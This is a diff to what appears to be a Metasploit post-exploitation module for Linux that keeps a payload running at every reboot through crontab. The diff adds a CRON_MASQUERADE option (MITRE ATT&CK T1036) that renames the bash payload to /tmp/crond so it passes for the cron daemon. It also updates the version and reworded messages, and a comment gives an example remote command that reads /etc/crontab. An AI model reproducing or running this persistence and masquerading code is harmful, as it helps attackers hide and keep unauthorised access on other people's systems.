@@ -35,6 +35,7 @@
 # The absoluct path of systemd directory          => set RPATH_SYSTEMD /etc/systemd/system
 # Delete persistence script/configurations        => set DEL_PERSISTENCE true
 # Execute one simple remote bash command          => set SINGLE_COM cat /etc/crontab
+# Masquerade payload.sh as cron daemon? (T1036)   => set CRON_MASQUERADE true
 # Use agents with shebang? (eg #!/usr/bin/python) => set SHEBANG true
 # ---
 # If sellected 'SHEBANG true' then agent execution will be based on is shebang
@@ -110,7 +111,7 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.8',
+                        'Version'        => '$Revision: 1.9',
                         'DisclosureDate' => 'jun 2 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
@@ -155,10 +156,12 @@ class MetasploitModule < Msf::Post
                                 OptBool.new('SHEBANG', [ false, 'Use agents with [shebang]? (eg #!/bin/sh)', false]),
                                 OptString.new('SINGLE_COM', [ false, 'Execute one simple bash command (eg uname -a)']),
                                 OptString.new('START_TIME', [ false, 'Time to wait for the agent to start (in seconds)', 8]),
-                                OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence scripts/configurations?', false])
+                                OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence scripts/configurations?', false]),
+                                OptBool.new('CRON_MASQUERADE', [ false, 'Masquerade payload.sh as cron daemon? (T1036)', false])
                         ], self.class) 
 
         end
+
 
 
 
@@ -442,6 +445,28 @@ Rex::sleep(1.0)
       Rex::sleep(1.0)
     end
 
+
+   #
+   # mitre ATT&CK T1036 [masquerade]
+   # Copies sh script, renames it as crond, to masquerade as the cron daemon.
+   #
+   if datastore['CRON_MASQUERADE'] == true
+   print_good("Mitre ATT&CK T1036 [masquerade as cron daemon]")
+   Rex::sleep(1.0)
+     if remote_path =~ /.sh/
+       # rename remote file to crond (cron file)
+       print_status("Renaming: #{remote_path} to: /tmp/crond")
+       client.fs.file.mv("#{remote_path}","/tmp/crond")
+       remote_path = "/tmp/crond"
+       Rex::sleep(1.0)
+     else
+       print_error("This function only accepts payloads.sh (bash)")
+       Rex::sleep(1.0)
+       print_warning("Using: #{remote_path} as payload name.")
+       Rex::sleep(1.5)
+     end
+   end
+
       #
       # This is the crontab command that provides persistence on startup ..
       #
@@ -457,7 +482,7 @@ Rex::sleep(1.0)
     # final displays
     print_good("Persistence achieved on: #{sysnfo['Computer']}")
     Rex::sleep(1.0)
-    print_warning("Payload: #{remote_path} will execute at reboot.")
+    print_warning("Payload: #{remote_path} will execute at every reboot.")
     Rex::sleep(1.0)
 end
 
@@ -632,6 +657,7 @@ end
       print_status("Remote crontab file absoluct path found.")
       Rex::sleep(1.0)
     end
+
 
       #
       # Delete crontab command line on crontab file ..
